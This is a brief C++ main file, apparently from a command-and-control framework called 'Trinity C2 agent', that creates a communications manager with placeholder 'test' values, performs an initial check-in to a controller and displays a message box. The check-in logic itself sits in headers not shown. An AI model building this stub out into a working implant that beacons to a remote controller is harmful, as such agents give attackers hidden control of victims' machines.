//  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ { START OF FILE } ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ //
#include "Agent.h"
#include "CommManager.h"


int main(int argc, char* argv[])
{
    CommManager manager("test", "test");
    manager.IntialCheckin();
    MessageBoxA(NULL, "Trinity C2 agent", ";)", MB_OK);
    return 0;
}

//  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ { END OF FILE } ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ //
